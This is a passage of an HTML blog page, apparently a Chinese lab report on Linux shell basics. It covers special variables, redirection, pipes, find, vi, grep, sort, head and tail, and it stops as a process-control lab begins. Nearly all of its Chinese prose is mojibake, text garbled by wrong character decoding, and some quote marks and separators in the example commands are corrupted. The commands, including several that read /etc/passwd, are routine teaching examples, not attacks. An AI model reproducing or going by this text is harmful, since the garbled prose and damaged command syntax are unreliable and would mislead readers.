href="#1-shellç®€ä»‹"></a> 1. shellç®€ä»‹</h4><p>shellæ˜¯ä¸€ä¸ªå‘½ä»¤è§£é‡Šç¨‹åºï¼Œ å®ƒæä¾›äº†æ“ä½œç³»ç»Ÿä¸ç”¨æˆ·ä¹‹é—´çš„ä¸»è¦ç•Œé¢ï¼Œæ§åˆ¶ç”¨æˆ·ä¸å†…æ ¸ä¹‹é—´çš„äº¤äº’ä½œç”¨ã€‚</p><p>é™¤äº†è§£é‡Šç”¨æˆ·ä»é”®ç›˜ä¸Šé”®å…¥çš„å‘½ä»¤å¤–ï¼Œshellä¹Ÿå¯ä»¥è§£é‡Šå­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚åœ¨Linuxä¸­ï¼Œå­˜å‚¨å‘½ä»¤çš„æ–‡æœ¬æ–‡ä»¶ç§°ä¸ºshellè„šæœ¬ï¼Œå¯ä»¥å…·æœ‰ä»»æ„çš„æ‰©å±•åã€‚shellå®é™…ä¸Šæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œshellç¼–ç¨‹å¹¿æ³›åœ°ç”¨äºè·å–ç»å¸¸æ‰§è¡Œçš„å‘½ä»¤å’Œè¿‡ç¨‹ã€‚</p><h4 id="2-shellç‰¹æ®Šå˜é‡"><a class="markdownIt-Anchor" href="#2-shellç‰¹æ®Šå˜é‡"></a> 2. shellç‰¹æ®Šå˜é‡</h4><p>$?â€”â€”ä¸Šä¸€æ¡å‘½ä»¤çš„æ‰§è¡Œæƒ…å†µ<br>$#â€”â€”å‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•°<br>$*â€”â€”æ‰€æœ‰å‘½ä»¤è¡Œå‚æ•°çš„å†…å®¹<br>$@â€”â€”æ‰€æœ‰å‘½ä»¤è¡Œå‚æ•°çš„å†…å®¹<br>â€‹$nâ€”â€”å‘½ä»¤è¡Œçš„ç¬¬nä¸ªå‚æ•°</p>â€”â€”å½“å‰shellç¨‹åºçš„pid\$!â€”â€”æœ€è¿‘ä¸€ä¸ªåœ¨åå°è¿è¡Œçš„å‘½ä»¤çš„pid\$-â€”â€”å½“å‰é€‰é¡¹æ ‡å¿—\$_â€”â€”ä¸Šä¸€æ¡å‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°#### 3. shellè„šæœ¬- å»ºç«‹shellè„šæœ¬  å¯ä»¥ç”¨æ¥å»ºç«‹æ–‡æœ¬æ–‡ä»¶çš„æ–¹æ³•éƒ½å¯ä»¥ç”¨æ¥å»ºç«‹shellè„šæœ¬ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ç”¨viç¼–è¾‘å™¨æˆ–æ˜¯emacsç¼–è¾‘å™¨æ¥å»ºç«‹ä¸€ä¸ªshellè„šæœ¬ï¼Œä¹Ÿå¯ä»¥é€šè¿‡é‡å®šå‘æ ‡å‡†è¾“å…¥å’Œè¾“å‡ºåœ¨å‘½ä»¤è¡Œä¸Šç›´æ¥å»ºç«‹shellè„šæœ¬æ–‡ä»¶ã€‚  å¦‚ä¸‹ä½¿ç”¨catå‘½ä»¤å»ºç«‹shellè„šæœ¬ï¼š  cat > print_user  echo User name:\$LOGNAME  echo Home directory: â€‹\$HOMEecho Current shell PID: <p>&lt;Ctrl+D&gt;</p><ul><li>æ‰§è¡Œshellè„šæœ¬<br>(1)ç”¨å­shellæ‰§è¡Œshellè„šæœ¬æ–‡ä»¶è¦ç”¨å­shellæ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶print_userï¼Œå¯ä»¥é”®å…¥å¦‚ä¸‹å‘½ä»¤ï¼š<br>$sh print_user<br>(2)ç”¨â€œ.â€å‘½ä»¤æ‰§è¡Œshellè„šæœ¬æ–‡ä»¶<br>â€œ.â€å‘½ä»¤çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼š<br>â€‹$ . shellè„šæœ¬æ–‡ä»¶å<br>(3)ç”¨execå‘½ä»¤æ‰§è¡Œshellè„šæœ¬æ–‡ä»¶<br>è¯¥å‘½ä»¤çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼š<br>â€‹$ exec .ï¼shellè„šæœ¬æ–‡ä»¶å</li></ul><p><img src="/posts/da9b6b33/image-20211030085349663.png" alt="image-20211030085349663"></p><h3 id="å››-å®éªŒå†…å®¹"><a class="markdownIt-Anchor" href="#å››-å®éªŒå†…å®¹"></a> å››ã€å®éªŒå†…å®¹</h3><h4 id="1-é€šé…ç¬¦"><a class="markdownIt-Anchor" href="#1-é€šé…ç¬¦"></a> 1. é€šé…ç¬¦</h4><ul><li>é€šé…ç¬¦ç”¨äºæ¨¡å¼åŒ¹é…ï¼Œå¦‚æ–‡ä»¶ååŒ¹é…ã€è·¯ç»åæœç´¢ã€å­—ç¬¦ä¸²æŸ¥æ‰¾ç­‰ã€‚å¸¸ç”¨çš„é€šé…ç¬¦æœ‰*ã€?å’Œæ‹¬åœ¨æ–¹æ‹¬å·[ ]ä¸­çš„å­—ç¬¦åºåˆ—ã€‚ç”¨æˆ·å¯ä»¥åœ¨ä½œä¸ºå‘½ä»¤å‚æ•°çš„æ–‡ä»¶åä¸­åŒ…</li><li>å«è¿™äº›é€šé…ç¬¦ï¼Œæ„æˆä¸€ä¸ªæ‰€è°“çš„â€œæ¨¡å¼ä¸²â€ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è¿›è¡Œæ¨¡å¼åŒ¹é…ã€‚</li><li>*ä»£è¡¨ä»»ä½•å­—ç¬¦ä¸²ï¼ˆé•¿åº¦å¯ä»¥ä¸ç­‰ï¼Œå¯ä»¥ä¸ºç©ºå­—ç¬¦ä¸²ï¼‰ã€‚<br>ä¾‹å¦‚ï¼šâ€œa*â€åŒ¹é…ä»¥aæ‰“å¤´çš„ä»»æ„å­—ç¬¦ä¸²ã€‚</li><li>ï¼Ÿä»£è¡¨ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚</li><li>[ ]ä»£è¡¨æŒ‡å®šçš„ä¸€ä¸ªå­—ç¬¦èŒƒå›´ï¼Œåªè¦æ–‡ä»¶åä¸­[ ]ä½ç½®å¤„çš„å­—ç¬¦åœ¨[ ]ä¸­æŒ‡å®šçš„èŒƒå›´ä¹‹å†…ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶åå°±ä¸è¿™ä¸ªæ¨¡å¼ä¸²åŒ¹é…ã€‚</li></ul><h4 id="2-é‡å®šå‘"><a class="markdownIt-Anchor" href="#2-é‡å®šå‘"></a> 2. é‡å®šå‘</h4><p>é‡å®šå‘å°±æ˜¯å°†æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºç”šè‡³æ ‡å‡†æŠ¥é”™é‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥è®©å‘½ä»¤ä»æŸä¸ªæ–‡ä»¶ä¸­è¯»å–å‚æ•°å’Œæ•°æ®ï¼Œå‘½ä»¤çš„è¾“å‡ºç»“æœä¹Ÿå¯ä»¥é€è‡³æŸä¸ªæ–‡ä»¶ä¸­è€Œä¸æ˜¯åœ¨ç»ˆç«¯ä¸Šæ˜¾ç¤ºå‡ºæ¥ã€‚å®ç°é‡å®šå‘çš„æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨æ”¹å‘æ“ä½œç¬¦ã€‚æ”¹å‘æ“ä½œç¬¦å¯ä»¥å°†æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†æŠ¥é”™æ”¹å‘åˆ°æŸä¸ªæ–‡ä»¶ã€‚</p><blockquote><p>ä¾‹ï¼šå°†æ˜¾ç¤ºç»“æœé‡å®šå‘åˆ°fileæ–‡ä»¶å½“ä¸­ã€‚</p><p>$ls â€“l &gt; file</p></blockquote><p><img src="/posts/da9b6b33/image-20211030094311466.png" alt="image-20211030094311466"></p><p>å¦ä¸€ ç§å®ç°é‡å®šå‘çš„æ–¹æ³•æ˜¯ä½¿ç”¨ç®¡é“(|)ï¼Œå®ƒå°†ä¸€æ¡å‘½ä»¤çš„è¾“å‡ºå‘é€åˆ°å¦ä¸€æ¡å‘½ä»¤çš„è¾“å…¥ã€‚</p><blockquote><p>ä¾‹ï¼šå°†æ–‡ä»¶junkä½œä¸ºä¿¡ä»¶çš„å†…å®¹ï¼Œç»™è‡ªå·±å‘ä¸ªmail</p><p>$cat junk|mail ç”¨æˆ·å</p></blockquote><h4 id="3-ç®¡é“åŠtee"><a class="markdownIt-Anchor" href="#3-ç®¡é“åŠtee"></a> 3. ç®¡é“åŠtee</h4><p>ç®¡é“æ“ä½œç¬¦å°†ä¸€æ¡å‘½ä»¤çš„è¾“å‡ºå®šå‘åˆ°å¦ä¸€æ¡å‘½ä»¤çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯å®šå‘åˆ°ç»ˆç«¯æˆ–æ–‡ä»¶ã€‚</p><blockquote><p>ä¾‹ï¼šä½¿ç”¨ä¸€ä¸ªç®¡é“æ“ä½œæ¥è®¡ç®—å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶æ•°ç›®</p><p>$ls | wc -w</p></blockquote><p><img src="/posts/da9b6b33/image-20211030100427858.png" alt="image-20211030100427858"></p><p>teeå‘½ä»¤ä½œç”¨å¯ä»¥ç”¨å­—æ¯Tæ¥å½¢è±¡åœ°è¡¨ç¤ºã€‚å®ƒæŠŠè¾“å‡ºçš„ä¸€ä¸ªå‰¯æœ¬è¾“é€åˆ°æ ‡å‡†è¾“å‡ºï¼Œå¦ä¸€ä¸ªå‰¯æœ¬æ‹·è´åˆ°ç›¸åº”çš„æ–‡ä»¶ä¸­ã€‚</p><blockquote><p>ä¾‹ï¼šå°†ä¸Šè¿°å‘½ä»¤çš„ç»“æœåŒæ—¶è¾“å‡ºåˆ°æ–‡ä»¶junkå½“ä¸­<br>$ls | wc â€“w | tee junk</p></blockquote><p><img src="/posts/da9b6b33/image-20211030100611018.png" alt="image-20211030100611018"></p><h4 id="4-ç¾¤å‘½ä»¤åŠç»­è¡Œç¬¦"><a class="markdownIt-Anchor" href="#4-ç¾¤å‘½ä»¤åŠç»­è¡Œç¬¦"></a> 4. ç¾¤å‘½ä»¤åŠç»­è¡Œç¬¦</h4><p>å¦‚æœå¸Œæœ›åœ¨æˆåŠŸåœ°æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ä¹‹åå†æ‰§è¡Œå¦ä¸€ä¸ªå‘½ä»¤ï¼Œæˆ–è€…åœ¨ä¸€ä¸ªå‘½ä»¤å¤±è´¥åå†æ‰§è¡Œå¦ä¸€ä¸ªå‘½ä»¤ï¼Œ&amp;&amp;å’Œ||å¯ä»¥å®Œæˆè¿™æ ·çš„åŠŸèƒ½ã€‚ç›¸åº”çš„å‘½ä»¤å¯ä»¥æ˜¯ç³»ç»Ÿå‘½ä»¤æˆ–shellè„šæœ¬ã€‚</p><p>shellè¿˜æä¾›äº†åœ¨å½“å‰shellæˆ–å­shellä¸­æ‰§è¡Œä¸€ç»„å‘½ä»¤çš„æ–¹æ³•ï¼Œå³ä½¿ç”¨ï¼ˆï¼‰å’Œ{ }ã€‚</p><blockquote><p>ä¾‹ï¼šè°ƒç”¨å¦‚ä¸‹å‘½ä»¤ï¼šæ˜¾ç¤ºæ—¥æœŸï¼›æ˜¾ç¤ºå·²ç»ç™»å½•åˆ°ç³»ç»Ÿä¸­çš„æ‰€æœ‰ç”¨æˆ·åï¼›æ˜¾ç¤ºå½“å‰ç›®å½•çš„åç§°ï¼›æ˜¾ç¤ºå½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶åã€‚<br>$ date; who; pwd; ls -a<br>è¿™ç»„å‘½ä»¤å°†æŒ‰é¡ºåºæ‰§è¡Œï¼Œä¸ç®¡å‰ä¸€å‘½ä»¤æ˜¯å¦å‡ºé”™ï¼Œåä¸€å‘½ä»¤ç»§ç»­æ‰§è¡Œ</p></blockquote><p><img src="/posts/da9b6b33/image-20211030100659567.png" alt="image-20211030100659567"></p><blockquote><p>ä¾‹ï¼šå°†file1ä¸­çš„å†…å®¹æ‹·è´åˆ°file2å½“ä¸­ï¼Œå¦‚æœæ‹·è´æˆåŠŸ ï¼Œåˆ™å›åº”ä¸€ä¸ªæ¶ˆæ¯ã€‚<br>$cp file1 file2 &amp;&amp; echo â€œcp is successful!â€</p></blockquote><p><img src="/posts/da9b6b33/image-20211030100841129.png" alt="image-20211030100841129"></p><blockquote><p>ä¾‹ï¼šä½¿ç”¨||ï¼Œå®ç°è‹¥æ‹·è´æ“ä½œä¸æˆåŠŸï¼Œåˆ™è¿”å›ä¸€ä¸ªæ¶ˆæ¯ã€‚<br>$cp file3 file1 || echo â€œcp is failed!â€</p></blockquote><p><img src="/posts/da9b6b33/image-20211030101131852.png" alt="image-20211030101131852"></p><blockquote><p>ä¾‹ï¼šåœ¨ä¸Šé¢çš„ä¾‹å­å½“ä¸­ï¼Œè‹¥æ‹·è´å¤±è´¥ï¼Œåˆ™å›åº”ä¸€ä¸ªæ¶ˆæ¯ï¼Œå¹¶ç»™è‡ªå·±å‘é€ä¸€å°é‚®ä»¶ï¼Œæœ€åé€€å‡ºã€‚<br>$cp file3 file1 || (echoâ€œcp is failed!â€ï¼›mail chen ;  exit)</p></blockquote><p><img src="/posts/da9b6b33/image-20211030103318759.png" alt="image-20211030103318759"></p><h4 id="5-findå‘½ä»¤"><a class="markdownIt-Anchor" href="#5-findå‘½ä»¤"></a> 5. findå‘½ä»¤</h4><p>findæ˜¯ä¸€ä¸ªéå¸¸æœ‰æ•ˆçš„å·¥å…·ï¼Œå®ƒå¯ä»¥éå†å½“å‰ç›®å½•ç”šè‡³äºæ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿæ¥æŸ¥æ‰¾æŸäº›æ–‡ä»¶æˆ–ç›®å½•ã€‚</p><p>findå‘½ä»¤çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šfind pathname -options [-print â€“ exec â€“ok]</p><ul><li>pathnameï¼šfindå‘½ä»¤æ‰€æŸ¥æ‰¾çš„ç›®å½•è·¯å¾„ã€‚</li><li>-printï¼šfindå‘½ä»¤å°†åŒ¹é…çš„æ–‡ä»¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚</li><li>-execï¼šfindå‘½ä»¤å¯¹åŒ¹é…çš„æ–‡ä»¶æ‰§è¡Œè¯¥å‚æ•°æ‰€ç»™å‡ºçš„shellå‘½ä»¤ã€‚</li><li>-ok å’Œ- execçš„ä½œç”¨ç›¸åŒï¼Œåªä¸è¿‡åœ¨æ‰§è¡Œæ¯ä¸€ä¸ªå‘½<br>ä»¤ä¹‹å‰ï¼Œéƒ½ä¼šç»™å‡ºæç¤ºï¼Œè®©ç”¨æˆ·æ¥ç¡®å®šæ˜¯å¦æ‰§è¡Œ</li></ul><blockquote><p>ä¾‹ï¼šåœ¨ä½ çš„ç”¨æˆ·ä¸»ç›®å½•ä¸­æŸ¥æ‰¾æ‰€æœ‰ä»¥å­—æ¯så¼€å¤´çš„ä»¶åã€‚è€Œåï¼Œå¯¹å®ƒä»¬è‡ªåŠ¨æ‰§è¡Œls â€“lå‘½ä»¤<br>$ find ~ -name â€œs*â€ -type f -exec ls -l {} \ï¼›</p></blockquote><p><img src="/posts/da9b6b33/image-20211030104212448.png" alt="image-20211030104212448"></p><blockquote><p>ä¾‹ï¼šé‡å¤ä¸Šä¸€æ­¥çš„æŸ¥æ‰¾ã€‚ä¸åŒçš„æ˜¯ï¼Œå¯¹æŸ¥æ‰¾çš„æ–‡ä»¶åæ‰§è¡Œls â€“lå‘½ä»¤æ—¶ï¼Œé‡‡ç”¨ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’çš„æ–¹å¼ã€‚<br>$ find ~ -name â€œs*â€ -type f -ok ls -l {} \ï¼›</p></blockquote><p><img src="/posts/da9b6b33/image-20211030104507621.png" alt="image-20211030104507621"></p><blockquote><p>ä¾‹ï¼šåœ¨/usrç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾æ‰€æœ‰ç”¨æˆ·zinoæ‹¥æœ‰çš„æ–‡ä»¶ã€‚è€Œåï¼Œè®¡ç®—å‡ºè¿™äº›æ–‡ä»¶çš„ä¸ªæ•°ã€‚å¹¶å°†æ‰€æœ‰çš„é”™è¯¯ä¿¡æ¯é‡å®šå‘åˆ°ä¸€ä¸ªåä¸ºerrfileçš„æ–‡ä»¶ä¸­ã€‚<br>$ find /usr/ -user zino -print 2&gt; errfile | wc -l</p></blockquote><p><img src="/posts/da9b6b33/image-20211030104831707.png" alt="image-20211030104831707"></p><h4 id="6-viç¼–è¾‘å™¨"><a class="markdownIt-Anchor" href="#6-viç¼–è¾‘å™¨"></a> 6. viç¼–è¾‘å™¨</h4><p>viç¼–è¾‘å™¨æ˜¯UNIXçš„å¼ºæœ‰åŠ›çš„æ–‡æœ¬æ–‡ä»¶ç¼–è¾‘å·¥å…·ï¼Œåˆ©ç”¨å®ƒå¯ä»¥å»ºç«‹ã€ä¿®æ”¹æ–‡æœ¬æ–‡ä»¶ã€‚</p><h5 id="1-viç¼–è¾‘å™¨çš„è¿›å…¥"><a class="markdownIt-Anchor" href="#1-viç¼–è¾‘å™¨çš„è¿›å…¥"></a> (1) viç¼–è¾‘å™¨çš„è¿›å…¥ï¼š</h5><p>vi æ–‡ä»¶å(è‡ªåŠ¨è¿›å…¥å‘½ä»¤æ–¹å¼)ã€‚</p><img src="/posts/da9b6b33/image-20211030105126128.png" alt="image-20211030105126128" style="zoom: 80%;"><h5 id="2-viç¼–è¾‘å™¨çš„é€€å‡º"><a class="markdownIt-Anchor" href="#2-viç¼–è¾‘å™¨çš„é€€å‡º"></a> (2) viç¼–è¾‘å™¨çš„é€€å‡ºï¼š</h5><p>åœ¨æŒ‡ä»¤æ¨¡å¼ä¸‹é”®å…¥:qï¼Œ:q!ï¼Œ:wqæˆ–:x(æ³¨æ„:å·), å°±ä¼šé€€å‡ºviã€‚å…¶ä¸­:wqå’Œ:xæ˜¯å­˜ç›˜é€€å‡ºï¼Œè€Œ:qæ˜¯ç›´æ¥é€€å‡ºã€‚</p><img src="/posts/da9b6b33/image-20211030105205014.png" alt="image-20211030105205014" style="zoom:80%;"><h5 id="3-åŸºæœ¬ç¼–è¾‘æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#3-åŸºæœ¬ç¼–è¾‘æŒ‡ä»¤"></a> (3) åŸºæœ¬ç¼–è¾‘æŒ‡ä»¤</h5><ul><li><p>æ–°å¢ (append)</p><ul><li>a ï¼šä»å…‰æ ‡æ‰€åœ¨ä½ç½®åé¢å¼€å§‹æ–°å¢èµ„æ–™ã€‚</li><li>Aï¼š ä»å…‰æ ‡æ‰€åœ¨åˆ—æœ€åé¢çš„åœ°æ–¹å¼€å§‹æ–°å¢åŠ èµ„æ–™</li></ul></li><li><p>æ’å…¥ (insert)</p><ul><li>iï¼š ä»å…‰æ ‡æ‰€åœ¨ä½ç½®å‰é¢å¼€å§‹æ’å…¥èµ„æ–™ã€‚</li><li>I ï¼šä»å…‰æ ‡æ‰€åœ¨åˆ—çš„ç¬¬ä¸€ä¸ªéç©ºç™½å­—å…ƒå‰é¢å¼€å§‹æ’å…¥èµ„æ–™ã€‚</li></ul></li><li><p>å¼€å§‹ (open)</p><ul><li>o ï¼šåœ¨å…‰æ ‡æ‰€åœ¨åˆ—ä¸‹æ–°å¢ä¸€åˆ—å¹¶è¿›å…¥è¾“å…¥æ¨¡å¼ã€‚</li><li>O: åœ¨å…‰æ ‡æ‰€åœ¨åˆ—ä¸Šæ–¹æ–°å¢ä¸€åˆ—å¹¶è¿›å…¥è¾“å…¥æ¨¡å¼ã€‚</li><li>xï¼š åˆ é™¤å…‰æ ‡æ‰€åœ¨å­—ç¬¦ã€‚</li><li>dd ï¼šåˆ é™¤å…‰æ ‡æ‰€åœ¨çš„åˆ—ã€‚</li><li>r ï¼šä¿®æ”¹å…‰æ ‡æ‰€åœ¨å­—å…ƒï¼Œr åæ¥è‘—è¦ä¿®æ­£çš„å­—ç¬¦ã€‚</li><li>Rï¼šè¿›å…¥å–æ›¿æ¢çŠ¶æ€ï¼Œæ–°å¢æ–‡å­—ä¼šè¦†ç›–åŸå…ˆæ–‡å­—ï¼Œç›´åˆ°æŒ‰[ESC] å›åˆ°æŒ‡ä»¤æ¨¡å¼ä¸‹ä¸ºæ­¢ã€‚</li><li>sï¼š åˆ é™¤å…‰æ ‡æ‰€åœ¨å­—å…ƒï¼Œå¹¶è¿›å…¥è¾“å…¥æ¨¡å¼ã€‚</li><li>Sï¼š åˆ é™¤å…‰æ ‡æ‰€åœ¨çš„åˆ—ï¼Œå¹¶è¿›å…¥è¾“å…¥æ¨¡å¼ã€‚</li></ul></li></ul><h4 id="7-grepå‘½ä»¤"><a class="markdownIt-Anchor" href="#7-grepå‘½ä»¤"></a> 7. grepå‘½ä»¤</h4><p>grepå‘½ä»¤ä»æŒ‡å®šçš„è¾“å…¥æ–‡ä»¶ä¸­æŸ¥æ‰¾ä¸æŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼ç›¸åŒ¹é…çš„è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œgrepå‘½ä»¤å°†è¾“å‡ºæ‰€æ‰¾åˆ°<br>çš„åŒ¹é…è¡Œã€‚</p><p>grepå‘½ä»¤çš„ä¸€èˆ¬å½¢å¼å¦‚ä¸‹ï¼šgrep [options] [regular-expression] [file1, file2, â€¦]</p><p>å…¶ä¸­ï¼ŒoptionsæŒ‡å®šgrepå‘½ä»¤çš„å„ç§é€‰é¡¹ï¼ŒregularexpressionæŒ‡å®šç”¨æ¥æŸ¥æ‰¾çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œfile1ï¼Œfile2ï¼Œâ€¦ç­‰å‚æ•°æ˜¯è¦æŸ¥æ‰¾çš„è¾“å…¥æ–‡ä»¶åã€‚åœ¨æœ€ç®€å•çš„æƒ…å†µä¸‹ï¼Œç”¨æ¥æŸ¥æ‰¾çš„æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥æ˜¯ç®€å•çš„å­—ç¬¦ä¸²ã€‚</p><blockquote><p>ä¾‹ï¼šåœ¨æ–‡ä»¶/etc/passwdä¸­ï¼Œæ‰¾å‡ºæ‰€æœ‰ä»¥nmå¼€å¤´çš„ç”¨æˆ·åæ‰€åœ¨çš„æ–‡æœ¬è¡Œã€‚<br>$ grep â€˜^nmâ€™ /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030105817077.png" alt="image-20211030105817077"></p><blockquote><p>ä¾‹ï¼šåœ¨æ–‡ä»¶/etc/passwdä¸­ï¼Œæ‰¾å‡ºæ‰€æœ‰ä»¥nologinç»“å°¾çš„æ–‡æœ¬è¡Œã€‚<br>$grep â€˜nologin$â€™ /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030105940431.png" alt="image-20211030105940431"></p><blockquote><p>ä¾‹ï¼šåœ¨æ–‡ä»¶/etc/passwdä¸­ï¼Œæ‰¾å‡ºæ‰€æœ‰åŒ…å«rootçš„æ–‡ä½“è¡Œï¼Œå¹¶å°†è¾“å‡ºé‡å®šå‘åˆ°passwd.outæ–‡ä»¶å½“ä¸­<br>$grep â€˜rootâ€™ /etc/passwd &gt; passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030110907325.png" alt="image-20211030110907325"></p><h4 id="8-sortå‘½ä»¤"><a class="markdownIt-Anchor" href="#8-sortå‘½ä»¤"></a> 8. sortå‘½ä»¤</h4><p>sortå‘½ä»¤çš„åŠŸèƒ½æ˜¯å¯¹æ–‡ä»¶ä¸­çš„å„è¡Œè¿›è¡Œæ’åºï¼Œå¹¶ç»“æœæ˜¾ç¤ºåœ¨æ ‡å‡†è¾“å‡ºä¸Šã€‚å¦‚ä¸æŒ‡å®šè¾“å…¥æ–‡ä»¶æˆ–ä½¿ç”¨â€œ-â€ï¼Œåˆ™è¡¨ç¤ºæ’åºå†…å®¹æ¥è‡ªæ ‡å‡†è¾“å…¥ã€‚</p><p>sort å‘½ä»¤çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šsort [options] file</p><blockquote><p>ä¾‹ï¼šä»¥å­—æ¯é¡ºåºæ˜¾ç¤º/etc/passwdæ–‡ä»¶çš„å†…å®¹ã€‚ç„¶åï¼Œä»¥é€†åºæ˜¾ç¤ºå…¶å†…å®¹ã€‚<br>$ sort /etc/passwd<br>$ sort -r /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030111144737.png" alt="image-20211030111144737"></p><p><img src="/posts/da9b6b33/image-20211030111139595.png" alt="image-20211030111139595"></p><h4 id="9-headå‘½ä»¤ä¸tailå‘½ä»¤"><a class="markdownIt-Anchor" href="#9-headå‘½ä»¤ä¸tailå‘½ä»¤"></a> 9. headå‘½ä»¤ä¸tailå‘½ä»¤</h4><blockquote><p>ä¾‹ï¼š æ˜¾ç¤º/etc/passwdæ–‡ä»¶çš„å‰10è¡Œçš„å†…å®¹<br>$ head -10 /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030111210783.png" alt="image-20211030111210783"></p><blockquote><p>ä¾‹ï¼šæ˜¾ç¤º/etc/passwdæ–‡ä»¶çš„å‰5è¡Œçš„å†…å®¹<br>$ head -5 /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030111238931.png" alt="image-20211030111238931"></p><blockquote><p>ä¾‹ï¼šæ˜¾ç¤º/etc/passwdæ–‡ä»¶çš„å10è¡Œçš„å†…å®¹<br>$ tail -10 /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030111258622.png" alt="image-20211030111258622"></p><h2 id="å®éªŒ5-æ§åˆ¶è¿›ç¨‹"><a class="markdownIt-Anchor" href="#å®éªŒ5-æ§åˆ¶è¿›ç¨‹"></a> å®éªŒ5 æ§åˆ¶è¿›ç¨‹</h2><h3 id="ä¸€-å®éªŒç›®çš„-2"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒç›®çš„-2"></a> ä¸€ã€å®éªŒç›®çš„</h3><ul><li>ç†Ÿæ‚‰è¿›ç¨‹çš„æ“ä½œä¸æ§åˆ¶</li><li>æŒæ¡ä½¿ç”¨linuxå‘½ä»¤ç®¡ç†å’Œæ“ä½œè¿›ç¨‹çš„æ–¹æ³•</li></ul><h3 id="äºŒ-å®éªŒè¦æ±‚-2"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒè¦æ±‚-2"></a> äºŒã€å®éªŒè¦æ±‚</h3><ul><li>ä½¿ç”¨psä¸jobså‘½ä»¤ç›‘è§†è¿›ç¨‹</li><li>ä½¿ç”¨killä¸jobså‘½ä»¤æ§åˆ¶è¿›ç¨‹</li><li>æ˜¾ç¤ºå½“å‰è¿›ç¨‹çš„ID</li></ul><h3 id="ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†-2"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†-2"></a> ä¸‰ã€å®éªŒé¢„å¤‡çŸ¥è¯†</h3><h4 id="1-å¤šç”¨æˆ·"><a class="markdownIt-Anchor" href="#1-å¤šç”¨æˆ·"></a> 1ã€å¤šç”¨æˆ·</h4><p>LINUXæ“ä½œç³»ç»Ÿçš„ä¸€ä¸ªä¼˜ç‚¹å°±æ˜¯ï¼Œå®ƒå®Œå…¨æ˜¯ä½œä¸ºä¸€ä¸ªå¤šç”¨æˆ·çš„ç³»ç»Ÿè®¾è®¡çš„ï¼ŒLINUXæ“ä½œç³»ç»Ÿæä¾›äº†åˆ†æ—¶æ“ä½œåŠŸèƒ½ã€‚å¤šç”¨æˆ·åŠŸèƒ½ï¼Œä¸ä»…ä»…åœ¨äºåŒæ—¶ä¸ºå¤šä¸ªç”¨æˆ·æä¾›è®¡ç®—æ”¯æŒï¼Œå®ƒè¿˜åº”åŒ…æ‹¬ä¸ºç³»ç»Ÿä¸­çš„å„ä¸ªç”¨æˆ·çš„æ•°æ®æä¾›ä¿æŠ¤æ–¹æ¡ˆã€‚åœ¨å¤šç”¨æˆ·çš„æ”¯æŒä¸‹ï¼Œç”¨æˆ·ä»¬å¯ä»¥åœ¨åŒä¸€å°è®¡ç®—æœºä¸ŠåŒæ—¶è¿›è¡Œä¸åŒçš„æ“ä½œï¼Œè¿˜å¯ä»¥åŒæ—¶åè°ƒå®ŒæˆåŒä¸€ä»»åŠ¡ã€‚</p><h4 id="2-å¤šä»»åŠ¡"><a class="markdownIt-Anchor" href="#2-å¤šä»»åŠ¡"></a> 2ã€å¤šä»»åŠ¡</h4><p>å¤šä»»åŠ¡æ˜¯æŒ‡åœ¨åŒä¸€æ—¶é—´å†…å¯ä»¥åŒæ—¶å¯åŠ¨å¤šä¸ªç¨‹åºï¼Œå„ä¸ªç¨‹åºåŒæ—¶è¿è¡Œï¼Œåè°ƒåœ°ä½¿ç”¨ç³»ç»Ÿèµ„æºã€‚å¤šä»»åŠ¡çš„å®ç°éœ€è¦ç”±æ“ä½œç³»ç»Ÿæ¥æ”¯æŒï¼Œä¸åŒç¨‹åºçš„è¿è¡Œéœ€è¦ç”±æ“ä½œç³»ç»Ÿæ¥è°ƒåº¦ã€‚ä»å¤šä»»åŠ¡å®ç°çš„è§’åº¦æ¥è¯´ï¼Œå¤šä»»åŠ¡åˆ†ä¸ºä¸¤ç±»ï¼šåä½œå¼å¤šä»»åŠ¡å’ŒæŠ¢å å¼å¤šä»»åŠ¡ã€‚</p><h4 id="3-è¿›ç¨‹"><a class="markdownIt-Anchor" href="#3-è¿›ç¨‹"></a> 